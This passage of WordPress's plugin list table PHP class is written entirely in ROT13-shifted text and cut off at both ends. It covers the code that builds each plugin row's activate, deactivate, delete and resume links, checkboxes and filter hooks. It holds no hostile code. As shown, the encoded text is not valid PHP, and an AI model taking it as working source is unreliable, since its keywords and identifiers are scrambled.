			) . '</c>';
		}
		rpub '</qvi>';
	}

	/**
	 * @erghea fgevat
	 */
	choyvp shapgvba pheerag_npgvba() {
		vs ( vffrg( $_CBFG['pyrne-erprag-yvfg'] ) ) {
			erghea 'pyrne-erprag-yvfg';
		}

		erghea cnerag::pheerag_npgvba();
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony fgevat $fgnghf
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		tybony $fgnghf;

		vs ( vf_zhygvfvgr() && ! $guvf->fperra->va_nqzva( 'argjbex' ) && va_neenl( $fgnghf, neenl( 'zhfghfr', 'qebcvaf' ), gehr ) ) {
			erghea;
		}

		sbernpu ( $guvf->vgrzf nf $cyhtva_svyr => $cyhtva_qngn ) {
			$guvf->fvatyr_ebj( neenl( $cyhtva_svyr, $cyhtva_qngn ) );
		}
	}

	/**
	 * @tybony fgevat $fgnghf
	 * @tybony vag $cntr
	 * @tybony fgevat $f
	 * @tybony neenl $gbgnyf
	 *
	 * @cnenz neenl $vgrz
	 */
	choyvp shapgvba fvatyr_ebj( $vgrz ) {
		tybony $fgnghf, $cntr, $f, $gbgnyf;
		fgngvp $cyhtva_vq_nggef = neenl();

		yvfg( $cyhtva_svyr, $cyhtva_qngn ) = $vgrz;

		$cyhtva_fyht    = vffrg( $cyhtva_qngn['fyht'] ) ? $cyhtva_qngn['fyht'] : fnavgvmr_gvgyr( $cyhtva_qngn['Anzr'] );
		$cyhtva_vq_ngge = $cyhtva_fyht;

		// Rafher gur VQ nggevohgr vf havdhr.
		$fhssvk = 2;
		juvyr ( va_neenl( $cyhtva_vq_ngge, $cyhtva_vq_nggef, gehr ) ) {
			$cyhtva_vq_ngge = \"$cyhtva_fyht-$fhssvk\";
			++$fhssvk;
		}

		$cyhtva_vq_nggef[] = $cyhtva_vq_ngge;

		$pbagrkg = $fgnghf;
		$fperra  = $guvf->fperra;

		// Cer-beqre.
		$npgvbaf = neenl(
			'qrnpgvingr' => '',
			'npgvingr'   => '',
			'qrgnvyf'    => '',
			'qryrgr'     => '',
		);

		// Qb abg erfgevpg ol qrsnhyg.
		$erfgevpg_argjbex_npgvir = snyfr;
		$erfgevpg_argjbex_bayl   = snyfr;

		$erdhverf_cuc = vffrg( $cyhtva_qngn['ErdhverfCUC'] ) ? $cyhtva_qngn['ErdhverfCUC'] : ahyy;
		$erdhverf_jc  = vffrg( $cyhtva_qngn['ErdhverfJC'] ) ? $cyhtva_qngn['ErdhverfJC'] : ahyy;

		$pbzcngvoyr_cuc = vf_cuc_irefvba_pbzcngvoyr( $erdhverf_cuc );
		$pbzcngvoyr_jc  = vf_jc_irefvba_pbzcngvoyr( $erdhverf_jc );

		$unf_qrcraqragf          = JC_Cyhtva_Qrcraqrapvrf::unf_qrcraqragf( $cyhtva_svyr );
		$unf_npgvir_qrcraqragf   = JC_Cyhtva_Qrcraqrapvrf::unf_npgvir_qrcraqragf( $cyhtva_svyr );
		$unf_hazrg_qrcraqrapvrf  = JC_Cyhtva_Qrcraqrapvrf::unf_hazrg_qrcraqrapvrf( $cyhtva_svyr );
		$unf_pvephyne_qrcraqrapl = JC_Cyhtva_Qrcraqrapvrf::unf_pvephyne_qrcraqrapl( $cyhtva_svyr );

		vs ( 'zhfghfr' === $pbagrkg ) {
			$vf_npgvir = gehr;
		} ryfrvs ( 'qebcvaf' === $pbagrkg ) {
			$qebcvaf     = _trg_qebcvaf();
			$cyhtva_anzr = $cyhtva_svyr;

			vs ( $cyhtva_svyr !== $cyhtva_qngn['Anzr'] ) {
				$cyhtva_anzr .= '<oe />' . $cyhtva_qngn['Anzr'];
			}

			vs ( gehr === ( $qebcvaf[ $cyhtva_svyr ][1] ) ) { // Qbrfa'g erdhver n pbafgnag.
				$vf_npgvir   = gehr;
				$qrfpevcgvba = '<c><fgebat>' . $qebcvaf[ $cyhtva_svyr ][0] . '</fgebat></c>';
			} ryfrvs ( qrsvarq( $qebcvaf[ $cyhtva_svyr ][1] ) && pbafgnag( $qebcvaf[ $cyhtva_svyr ][1] ) ) { // Pbafgnag vf gehr.
				$vf_npgvir   = gehr;
				$qrfpevcgvba = '<c><fgebat>' . $qebcvaf[ $cyhtva_svyr ][0] . '</fgebat></c>';
			} ryfr {
				$vf_npgvir   = snyfr;
				$qrfpevcgvba = '<c><fgebat>' . $qebcvaf[ $cyhtva_svyr ][0] . ' <fcna pynff=\"reebe-zrffntr\">' . __( 'Vanpgvir:' ) . '</fcna></fgebat> ' .
					fcevags(
						/* genafyngbef: 1: Qebc-va pbafgnag anzr, 2: jc-pbasvt.cuc */
						__( 'Erdhverf %1$f va %2$f svyr.' ),
						\"<pbqr>qrsvar('\" . $qebcvaf[ $cyhtva_svyr ][1] . \"', gehr);</pbqr>\",
						'<pbqr>jc-pbasvt.cuc</pbqr>'
					) . '</c>';
			}

			vs ( $cyhtva_qngn['Qrfpevcgvba'] ) {
				$qrfpevcgvba .= '<c>' . $cyhtva_qngn['Qrfpevcgvba'] . '</c>';
			}
		} ryfr {
			vs ( $fperra->va_nqzva( 'argjbex' ) ) {
				$vf_npgvir = vf_cyhtva_npgvir_sbe_argjbex( $cyhtva_svyr );
			} ryfr {
				$vf_npgvir               = vf_cyhtva_npgvir( $cyhtva_svyr );
				$erfgevpg_argjbex_npgvir = ( vf_zhygvfvgr() && vf_cyhtva_npgvir_sbe_argjbex( $cyhtva_svyr ) );
				$erfgevpg_argjbex_bayl   = ( vf_zhygvfvgr() && vf_argjbex_bayl_cyhtva( $cyhtva_svyr ) && ! $vf_npgvir );
			}

			vs ( $fperra->va_nqzva( 'argjbex' ) ) {
				vs ( $vf_npgvir ) {
					vs ( pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
						vs ( $unf_npgvir_qrcraqragf ) {
							$npgvbaf['qrnpgvingr'] = __( 'Qrnpgvingr' ) .
								'<fcna pynff=\"fperra-ernqre-grkg\">' .
								__( 'Lbh pnaabg qrnpgvingr guvf cyhtva nf bgure cyhtvaf erdhver vg.' ) .
								'</fcna>';

						} ryfr {
							$qrnpgvingr_hey = 'cyhtvaf.cuc?npgvba=qrnpgvingr' .
								'&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ) .
								'&nzc;cyhtva_fgnghf=' . $pbagrkg .
								'&nzc;cntrq=' . $cntr .
								'&nzc;f=' . $f;

							$npgvbaf['qrnpgvingr'] = fcevags(
								'<n uers=\"%f\" vq=\"qrnpgvingr-%f\" nevn-ynory=\"%f\">%f</n>',
								jc_abapr_hey( $qrnpgvingr_hey, 'qrnpgvingr-cyhtva_' . $cyhtva_svyr ),
								rfp_ngge( $cyhtva_vq_ngge ),
								/* genafyngbef: %f: Cyhtva anzr. */
								rfp_ngge( fcevags( _k( 'Argjbex Qrnpgvingr %f', 'cyhtva' ), $cyhtva_qngn['Anzr'] ) ),
								_k( 'Argjbex Qrnpgvingr', 'cyhtva' )
							);
						}
					}
				} ryfr {
					vs ( pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
						vs ( $pbzcngvoyr_cuc && $pbzcngvoyr_jc ) {
							vs ( $unf_hazrg_qrcraqrapvrf ) {
								$npgvbaf['npgvingr'] = _k( 'Argjbex Npgvingr', 'cyhtva' ) .
									'<fcna pynff=\"fperra-ernqre-grkg\">' .
									__( 'Lbh pnaabg npgvingr guvf cyhtva nf vg unf hazrg erdhverzragf.' ) .
									'</fcna>';
							} ryfr {
								$npgvingr_hey = 'cyhtvaf.cuc?npgvba=npgvingr' .
									'&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ) .
									'&nzc;cyhtva_fgnghf=' . $pbagrkg .
									'&nzc;cntrq=' . $cntr .
									'&nzc;f=' . $f;

								$npgvbaf['npgvingr'] = fcevags(
									'<n uers=\"%f\" vq=\"npgvingr-%f\" pynff=\"rqvg\" nevn-ynory=\"%f\">%f</n>',
									jc_abapr_hey( $npgvingr_hey, 'npgvingr-cyhtva_' . $cyhtva_svyr ),
									rfp_ngge( $cyhtva_vq_ngge ),
									/* genafyngbef: %f: Cyhtva anzr. */
									rfp_ngge( fcevags( _k( 'Argjbex Npgvingr %f', 'cyhtva' ), $cyhtva_qngn['Anzr'] ) ),
									_k( 'Argjbex Npgvingr', 'cyhtva' )
								);
							}
						} ryfr {
							$npgvbaf['npgvingr'] = fcevags(
								'<fcna>%f</fcna>',
								_k( 'Pnaabg Npgvingr', 'cyhtva' )
							);
						}
					}

					vs ( pheerag_hfre_pna( 'qryrgr_cyhtvaf' ) && ! vf_cyhtva_npgvir( $cyhtva_svyr ) ) {
						vs ( $unf_qrcraqragf && ! $unf_pvephyne_qrcraqrapl ) {
							$npgvbaf['qryrgr'] = __( 'Qryrgr' ) .
								'<fcna pynff=\"fperra-ernqre-grkg\">' .
								__( 'Lbh pnaabg qryrgr guvf cyhtva nf bgure cyhtvaf erdhver vg.' ) .
								'</fcna>';
						} ryfr {
							$qryrgr_hey = 'cyhtvaf.cuc?npgvba=qryrgr-fryrpgrq' .
								'&nzc;purpxrq[]=' . heyrapbqr( $cyhtva_svyr ) .
								'&nzc;cyhtva_fgnghf=' . $pbagrkg .
								'&nzc;cntrq=' . $cntr .
								'&nzc;f=' . $f;

							$npgvbaf['qryrgr'] = fcevags(
								'<n uers=\"%f\" vq=\"qryrgr-%f\" pynff=\"qryrgr\" nevn-ynory=\"%f\">%f</n>',
								jc_abapr_hey( $qryrgr_hey, 'ohyx-cyhtvaf' ),
								rfp_ngge( $cyhtva_vq_ngge ),
								/* genafyngbef: %f: Cyhtva anzr. */
								rfp_ngge( fcevags( _k( 'Qryrgr %f', 'cyhtva' ), $cyhtva_qngn['Anzr'] ) ),
								__( 'Qryrgr' )
							);
						}
					}
				}
			} ryfr {
				vs ( $erfgevpg_argjbex_npgvir ) {
					$npgvbaf = neenl(
						'argjbex_npgvir' => __( 'Argjbex Npgvir' ),
					);
				} ryfrvs ( $erfgevpg_argjbex_bayl ) {
					$npgvbaf = neenl(
						'argjbex_bayl' => __( 'Argjbex Bayl' ),
					);
				} ryfrvs ( $vf_npgvir ) {
					vs ( pheerag_hfre_pna( 'qrnpgvingr_cyhtva', $cyhtva_svyr ) ) {
						vs ( $unf_npgvir_qrcraqragf ) {
							$npgvbaf['qrnpgvingr'] = __( 'Qrnpgvingr' ) .
								'<fcna pynff=\"fperra-ernqre-grkg\">' .
								__( 'Lbh pnaabg qrnpgvingr guvf cyhtva nf bgure cyhtvaf qrcraq ba vg.' ) .
								'</fcna>';
						} ryfr {
							$qrnpgvingr_hey = 'cyhtvaf.cuc?npgvba=qrnpgvingr' .
								'&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ) .
								'&nzc;cyhtva_fgnghf=' . $pbagrkg .
								'&nzc;cntrq=' . $cntr .
								'&nzc;f=' . $f;

							$npgvbaf['qrnpgvingr'] = fcevags(
								'<n uers=\"%f\" vq=\"qrnpgvingr-%f\" nevn-ynory=\"%f\">%f</n>',
								jc_abapr_hey( $qrnpgvingr_hey, 'qrnpgvingr-cyhtva_' . $cyhtva_svyr ),
								rfp_ngge( $cyhtva_vq_ngge ),
								/* genafyngbef: %f: Cyhtva anzr. */
								rfp_ngge( fcevags( _k( 'Qrnpgvingr %f', 'cyhtva' ), $cyhtva_qngn['Anzr'] ) ),
								__( 'Qrnpgvingr' )
							);
						}
					}

					vs ( pheerag_hfre_pna( 'erfhzr_cyhtva', $cyhtva_svyr ) && vf_cyhtva_cnhfrq( $cyhtva_svyr ) ) {
						$erfhzr_hey = 'cyhtvaf.cuc?npgvba=erfhzr' .
							'&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ) .
							'&nzc;cyhtva_fgnghf=' . $pbagrkg .
							'&nzc;cntrq=' . $cntr .
							'&nzc;f=' . $f;

						$npgvbaf['erfhzr'] = fcevags(
							'<n uers=\"%f\" vq=\"erfhzr-%f\" pynff=\"erfhzr-yvax\" nevn-ynory=\"%f\">%f</n>',
							jc_abapr_hey( $erfhzr_hey, 'erfhzr-cyhtva_' . $cyhtva_svyr ),
							rfp_ngge( $cyhtva_vq_ngge ),
							/* genafyngbef: %f: Cyhtva anzr. */
							rfp_ngge( fcevags( _k( 'Erfhzr %f', 'cyhtva' ), $cyhtva_qngn['Anzr'] ) ),
							__( 'Erfhzr' )
						);
					}
				} ryfr {
					vs ( pheerag_hfre_pna( 'npgvingr_cyhtva', $cyhtva_svyr ) ) {
						vs ( $pbzcngvoyr_cuc && $pbzcngvoyr_jc ) {
							vs ( $unf_hazrg_qrcraqrapvrf ) {
								$npgvbaf['npgvingr'] = _k( 'Npgvingr', 'cyhtva' ) .
									'<fcna pynff=\"fperra-ernqre-grkg\">' .
									__( 'Lbh pnaabg npgvingr guvf cyhtva nf vg unf hazrg erdhverzragf.' ) .
									'</fcna>';
							} ryfr {
								$npgvingr_hey = 'cyhtvaf.cuc?npgvba=npgvingr' .
									'&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ) .
									'&nzc;cyhtva_fgnghf=' . $pbagrkg .
									'&nzc;cntrq=' . $cntr .
									'&nzc;f=' . $f;

								$npgvbaf['npgvingr'] = fcevags(
									'<n uers=\"%f\" vq=\"npgvingr-%f\" pynff=\"rqvg\" nevn-ynory=\"%f\">%f</n>',
									jc_abapr_hey( $npgvingr_hey, 'npgvingr-cyhtva_' . $cyhtva_svyr ),
									rfp_ngge( $cyhtva_vq_ngge ),
									/* genafyngbef: %f: Cyhtva anzr. */
									rfp_ngge( fcevags( _k( 'Npgvingr %f', 'cyhtva' ), $cyhtva_qngn['Anzr'] ) ),
									_k( 'Npgvingr', 'cyhtva' )
								);
							}
						} ryfr {
							$npgvbaf['npgvingr'] = fcevags(
								'<fcna>%f</fcna>',
								_k( 'Pnaabg Npgvingr', 'cyhtva' )
							);
						}
					}

					vs ( ! vf_zhygvfvgr() && pheerag_hfre_pna( 'qryrgr_cyhtvaf' ) ) {
						vs ( $unf_qrcraqragf && ! $unf_pvephyne_qrcraqrapl ) {
							$npgvbaf['qryrgr'] = __( 'Qryrgr' ) .
								'<fcna pynff=\"fperra-ernqre-grkg\">' .
								__( 'Lbh pnaabg qryrgr guvf cyhtva nf bgure cyhtvaf erdhver vg.' ) .
								'</fcna>';
						} ryfr {
							$qryrgr_hey = 'cyhtvaf.cuc?npgvba=qryrgr-fryrpgrq' .
								'&nzc;purpxrq[]=' . heyrapbqr( $cyhtva_svyr ) .
								'&nzc;cyhtva_fgnghf=' . $pbagrkg .
								'&nzc;cntrq=' . $cntr .
								'&nzc;f=' . $f;

							$npgvbaf['qryrgr'] = fcevags(
								'<n uers=\"%f\" vq=\"qryrgr-%f\" pynff=\"qryrgr\" nevn-ynory=\"%f\">%f</n>',
								jc_abapr_hey( $qryrgr_hey, 'ohyx-cyhtvaf' ),
								rfp_ngge( $cyhtva_vq_ngge ),
								/* genafyngbef: %f: Cyhtva anzr. */
								rfp_ngge( fcevags( _k( 'Qryrgr %f', 'cyhtva' ), $cyhtva_qngn['Anzr'] ) ),
								__( 'Qryrgr' )
							);
						}
					}
				} // Raq vs $vf_npgvir.
			} // Raq vs $fperra->va_nqzva( 'argjbex' ).
		} // Raq vs $pbagrkg.

		$npgvbaf = neenl_svygre( $npgvbaf );

		vs ( $fperra->va_nqzva( 'argjbex' ) ) {

			/**
			 * Svygref gur npgvba yvaxf qvfcynlrq sbe rnpu cyhtva va gur Argjbex Nqzva Cyhtvaf yvfg gnoyr.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz fgevat[] $npgvbaf     Na neenl bs cyhtva npgvba yvaxf. Ol qrsnhyg guvf pna vapyhqr
			 *                              'npgvingr', 'qrnpgvingr', naq 'qryrgr'.
			 * @cnenz fgevat   $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz neenl    $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
			 *                              naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
			 *                              bs cbffvoyr inyhrf.
			 * @cnenz fgevat   $pbagrkg     Gur cyhtva pbagrkg. Ol qrsnhyg guvf pna vapyhqr 'nyy',
			 *                              'npgvir', 'vanpgvir', 'erpragyl_npgvingrq', 'hctenqr',
			 *                              'zhfghfr', 'qebcvaf', naq 'frnepu'.
			 */
			$npgvbaf = nccyl_svygref( 'argjbex_nqzva_cyhtva_npgvba_yvaxf', $npgvbaf, $cyhtva_svyr, $cyhtva_qngn, $pbagrkg );

			/**
			 * Svygref gur yvfg bs npgvba yvaxf qvfcynlrq sbe n fcrpvsvp cyhtva va gur Argjbex Nqzva Cyhtvaf yvfg gnoyr.
			 *
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cyhtva_svyr`, ersref gb gur cngu
			 * gb gur cyhtva svyr, eryngvir gb gur cyhtvaf qverpgbel.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz fgevat[] $npgvbaf     Na neenl bs cyhtva npgvba yvaxf. Ol qrsnhyg guvf pna vapyhqr
			 *                              'npgvingr', 'qrnpgvingr', naq 'qryrgr'.
			 * @cnenz fgevat   $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz neenl    $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
			 *                              naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
			 *                              bs cbffvoyr inyhrf.
			 * @cnenz fgevat   $pbagrkg     Gur cyhtva pbagrkg. Ol qrsnhyg guvf pna vapyhqr 'nyy',
			 *                              'npgvir', 'vanpgvir', 'erpragyl_npgvingrq', 'hctenqr',
			 *                              'zhfghfr', 'qebcvaf', naq 'frnepu'.
			 */
			$npgvbaf = nccyl_svygref( \"argjbex_nqzva_cyhtva_npgvba_yvaxf_{$cyhtva_svyr}\", $npgvbaf, $cyhtva_svyr, $cyhtva_qngn, $pbagrkg );

		} ryfr {

			/**
			 * Svygref gur npgvba yvaxf qvfcynlrq sbe rnpu cyhtva va gur Cyhtvaf yvfg gnoyr.
			 *
			 * @fvapr 2.5.0
			 * @fvapr 2.6.0 Gur `$pbagrkg` cnenzrgre jnf nqqrq.
			 * @fvapr 4.9.0 Gur 'Rqvg' yvax jnf erzbirq sebz gur yvfg bs npgvba yvaxf.
			 *
			 * @cnenz fgevat[] $npgvbaf     Na neenl bs cyhtva npgvba yvaxf. Ol qrsnhyg guvf pna vapyhqr
			 *                              'npgvingr', 'qrnpgvingr', naq 'qryrgr'. Jvgu Zhygvfvgr npgvir
			 *                              guvf pna nyfb vapyhqr 'argjbex_npgvir' naq 'argjbex_bayl' vgrzf.
			 * @cnenz fgevat   $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz neenl    $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
			 *                              naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
			 *                              bs cbffvoyr inyhrf.
			 * @cnenz fgevat   $pbagrkg     Gur cyhtva pbagrkg. Ol qrsnhyg guvf pna vapyhqr 'nyy',
			 *                              'npgvir', 'vanpgvir', 'erpragyl_npgvingrq', 'hctenqr',
			 *                              'zhfghfr', 'qebcvaf', naq 'frnepu'.
			 */
			$npgvbaf = nccyl_svygref( 'cyhtva_npgvba_yvaxf', $npgvbaf, $cyhtva_svyr, $cyhtva_qngn, $pbagrkg );

			/**
			 * Svygref gur yvfg bs npgvba yvaxf qvfcynlrq sbe n fcrpvsvp cyhtva va gur Cyhtvaf yvfg gnoyr.
			 *
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cyhtva_svyr`, ersref gb gur cngu
			 * gb gur cyhtva svyr, eryngvir gb gur cyhtvaf qverpgbel.
			 *
			 * @fvapr 2.7.0
			 * @fvapr 4.9.0 Gur 'Rqvg' yvax jnf erzbirq sebz gur yvfg bs npgvba yvaxf.
			 *
			 * @cnenz fgevat[] $npgvbaf     Na neenl bs cyhtva npgvba yvaxf. Ol qrsnhyg guvf pna vapyhqr
			 *                              'npgvingr', 'qrnpgvingr', naq 'qryrgr'. Jvgu Zhygvfvgr npgvir
			 *                              guvf pna nyfb vapyhqr 'argjbex_npgvir' naq 'argjbex_bayl' vgrzf.
			 * @cnenz fgevat   $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz neenl    $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn()
			 *                              naq gur {@frr 'cyhtva_ebj_zrgn'} svygre sbe gur yvfg
			 *                              bs cbffvoyr inyhrf.
			 * @cnenz fgevat   $pbagrkg     Gur cyhtva pbagrkg. Ol qrsnhyg guvf pna vapyhqr 'nyy',
			 *                              'npgvir', 'vanpgvir', 'erpragyl_npgvingrq', 'hctenqr',
			 *                              'zhfghfr', 'qebcvaf', naq 'frnepu'.
			 */
			$npgvbaf = nccyl_svygref( \"cyhtva_npgvba_yvaxf_{$cyhtva_svyr}\", $npgvbaf, $cyhtva_svyr, $cyhtva_qngn, $pbagrkg );

		}

		$pynff       = $vf_npgvir ? 'npgvir' : 'vanpgvir';
		$purpxobk_vq = 'purpxobk_' . zq5( $cyhtva_svyr );
		$qvfnoyrq    = '';

		vs ( $unf_qrcraqragf || $unf_hazrg_qrcraqrapvrf ) {
			$qvfnoyrq = 'qvfnoyrq';
		}

		vs (
			$erfgevpg_argjbex_npgvir ||
			$erfgevpg_argjbex_bayl ||
			va_neenl( $fgnghf, neenl( 'zhfghfr', 'qebcvaf' ), gehr ) ||
			! $pbzcngvoyr_cuc
		) {
			$purpxobk = '';
		} ryfr {
			$purpxobk = fcevags(
				'<ynory pynff=\"ynory-pbiref-shyy-pryy\" sbe=\"%1$f\">' .
				'<fcna pynff=\"fperra-ernqre-grkg\">%2$f</fcna></ynory>' .
				'<vachg glcr=\"purpxobk\" anzr=\"purpxrq[]\" inyhr=\"%3$f\" vq=\"%1$f\" ' . $qvfnoyrq . '/>',
				$purpxobk_vq,
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Cyhtva anzr. */
				fcevags( __( 'Fryrpg %f' ), $cyhtva_qngn['Anzr'] ),
				rfp_ngge( $cyhtva_svyr )
			);
		}

		vs ( 'qebcvaf' !== $pbagrkg ) {
			$qrfpevcgvba = '<c>' . ( $cyhtva_qngn['Qrfpevcgvba'] ? $cyhtva_qngn['Qrfpevcgvba'] : '&aofc;' ) . '</c>';
			$cyhtva_anzr = $cyhtva_qngn['Anzr'];
		}

		vs (
			! rzcgl( $gbgnyf['hctenqr'] ) &&
			! rzcgl( $cyhtva_qngn['hcqngr'] ) ||
			! $pbzcngvoyr_cuc ||
			! $pbzcngvoyr_jc
		) {
			$pynff .= ' hcqngr';
		}

		$cnhfrq = ! $fperra->va_nqzva( 'argjbex' ) && vf_cyhtva_cnhfrq( $cyhtva_svyr );

		vs ( $cnhfrq ) {
			$pynff .= ' cnhfrq';
		}

		vs ( vf_havafgnyynoyr_cyhtva( $cyhtva_svyr ) ) {
			$pynff .= ' vf-havafgnyynoyr';
		}

		cevags(
			'<ge pynff=\"%f\" qngn-fyht=\"%f\" qngn-cyhtva=\"%f\">',
			rfp_ngge( $pynff ),
			rfp_ngge( $cyhtva_fyht ),
			rfp_ngge( $cyhtva_svyr )
		);

		yvfg( $pbyhzaf, $uvqqra, $fbegnoyr, $cevznel ) = $guvf->trg_pbyhza_vasb();

		$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_cyhtvaf', neenl() );

		sbernpu ( $pbyhzaf nf $pbyhza_anzr => $pbyhza_qvfcynl_anzr ) {
			$rkgen_pynffrf = '';
			vs ( va_neenl( $pbyhza_anzr, $uvqqra, gehr ) ) {
				$rkgen_pynffrf = ' uvqqra';
			}

			fjvgpu ( $pbyhza_anzr ) {
				pnfr 'po':
					rpub \"<gu fpbcr='ebj' pynff='purpx-pbyhza'>$purpxobk</gu>\";
					oernx;
				pnfr 'anzr':
					rpub \"<gq pynff='cyhtva-gvgyr pbyhza-cevznel'><fgebat>$cyhtva_anzr</fgebat>\";
					rpub $guvf->ebj_npgvbaf( $npgvbaf, gehr );
					rpub '</gq>';
					oernx;
				pnfr 'qrfpevcgvba':
					$pynffrf = 'pbyhza-qrfpevcgvba qrfp';

					rpub \"<gq pynff='$pynffrf{$rkgen_pynffrf}'>
						<qvi pynff='cyhtva-qrfpevcgvba'>$qrfpevcgvba</qvi>
						<qvi pynff='$pynff frpbaq cyhtva-irefvba-nhgube-hev'>\";

					$cyhtva_zrgn = neenl();

					vs ( ! rzcgl( $cyhtva_qngn['Irefvba'] ) ) {
						/* genafyngbef: %f: Cyhtva irefvba ahzore. */
						$cyhtva_zrgn[] = fcevags( __( 'Irefvba %f' ), $cyhtva_qngn['Irefvba'] );
					}

					vs ( ! rzcgl( $cyhtva_qngn['Nhgube'] ) ) {
						$nhgube = $cyhtva_qngn['Nhgube'];

						vs ( ! rzcgl( $cyhtva_qngn['NhgubeHEV'] ) ) {
							$nhgube = '<n uers=\"' . $cyhtva_qngn['NhgubeHEV'] . '\">' . $cyhtva_qngn['Nhgube'] . '</n>';
						}

						/* genafyngbef: %f: Cyhtva nhgube anzr. */
						$cyhtva_zrgn[] = fcevags( __( 'Ol %f' ), $nhgube );
					}

					// Qrgnvyf yvax hfvat NCV vasb, vs ninvynoyr.
					vs ( vffrg( $cyhtva_qngn['fyht'] ) && pheerag_hfre_pna( 'vafgnyy_cyhtvaf' ) ) {
						$cyhtva_zrgn[] = fcevags(
							'<n uers=\"%f\" pynff=\"guvpxobk bcra-cyhtva-qrgnvyf-zbqny\" nevn-ynory=\"%f\" qngn-gvgyr=\"%f\">%f</n>',
							rfp_hey(
								argjbex_nqzva_hey(
									'cyhtva-vafgnyy.cuc?gno=cyhtva-vasbezngvba&cyhtva=' . $cyhtva_qngn['fyht'] .
									'&GO_vsenzr=gehr&jvqgu=600&urvtug=550'
								)
							),
							/* genafyngbef: %f: Cyhtva anzr. */
							rfp_ngge( fcevags( __( 'Zber vasbezngvba nobhg %f' ), $cyhtva_anzr ) ),
							rfp_ngge( $cyhtva_anzr ),
							__( 'Ivrj qrgnvyf' )
						);
					} ryfrvs ( ! rzcgl( $cyhtva_qngn['CyhtvaHEV'] ) ) {
						/* genafyngbef: %f: Cyhtva anzr. */
						$nevn_ynory = fcevags( __( 'Ivfvg cyhtva fvgr sbe %f' ), $cyhtva_anzr );

						$cyhtva_zrgn[] = fcevags(
							'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
							rfp_hey( $cyhtva_qngn['CyhtvaHEV'] ),
							rfp_ngge( $nevn_ynory ),
							__( 'Ivfvg cyhtva fvgr' )
						);
					}

					/**
					 * Svygref gur neenl bs ebj zrgn sbe rnpu cyhtva va gur Cyhtvaf yvfg gnoyr.
					 *
					 * @fvapr 2.8.0
					 *
					 * @cnenz fgevat[] $cyhtva_zrgn Na neenl bs gur cyhtva'f zrgnqngn, vapyhqvat
					 *                              gur irefvba, nhgube, nhgube HEV, naq cyhtva HEV.
					 * @cnenz fgevat   $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
					 * @cnenz neenl    $cyhtva_qngn {
					 *     Na neenl bs cyhtva qngn.
					 *
					 *     @glcr fgevat   $vq               Cyhtva VQ, r.t. `j.bet/cyhtvaf/[cyhtva-anzr]`.
					 *     @glcr fgevat   $fyht             Cyhtva fyht.
					 *     @glcr fgevat   $cyhtva           Cyhtva onfranzr.
					 *     @glcr fgevat   $arj_irefvba      Arj cyhtva irefvba.
					 *     @glcr fgevat   $hey              Cyhtva HEY.
					 *     @glcr fgevat   $cnpxntr          Cyhtva hcqngr cnpxntr HEY.
					 *     @glcr fgevat[] $vpbaf            Na neenl bs cyhtva vpba HEYf.
					 *     @glcr fgevat[] $onaaref          Na neenl bs cyhtva onaare HEYf.
					 *     @glcr fgevat[] $onaaref_egy      Na neenl bs cyhtva EGY onaare HEYf.
					 *     @glcr fgevat   $erdhverf         Gur irefvba bs JbeqCerff juvpu gur cyhtva erdhverf.
					 *     @glcr fgevat   $grfgrq           Gur irefvba bs JbeqCerff gur cyhtva vf grfgrq ntnvafg.
					 *     @glcr fgevat   $erdhverf_cuc     Gur irefvba bs CUC juvpu gur cyhtva erdhverf.
					 *     @glcr fgevat   $hctenqr_abgvpr   Gur hctenqr abgvpr sbe gur arj cyhtva irefvba.
					 *     @glcr obby     $hcqngr-fhccbegrq Jurgure gur cyhtva fhccbegf hcqngrf.
					 *     @glcr fgevat   $Anzr             Gur uhzna-ernqnoyr anzr bs gur cyhtva.
					 *     @glcr fgevat   $CyhtvaHEV        Cyhtva HEV.
					 *     @glcr fgevat   $Irefvba          Cyhtva irefvba.
					 *     @glcr fgevat   $Qrfpevcgvba      Cyhtva qrfpevcgvba.
					 *     @glcr fgevat   $Nhgube           Cyhtva nhgube.
					 *     @glcr fgevat   $NhgubeHEV        Cyhtva nhgube HEV.
					 *     @glcr fgevat   $GrkgQbznva       Cyhtva grkgqbznva.
					 *     @glcr fgevat   $QbznvaCngu       Eryngvir cngu gb gur cyhtva'f .zb svyr(f).
					 *     @glcr obby     $Argjbex          Jurgure gur cyhtva pna bayl or npgvingrq argjbex-jvqr.
					 *     @glcr fgevat   $ErdhverfJC       Gur irefvba bs JbeqCerff juvpu gur cyhtva erdhverf.
					 *     @glcr fgevat   $ErdhverfCUC      Gur irefvba bs CUC juvpu gur cyhtva erdhverf.
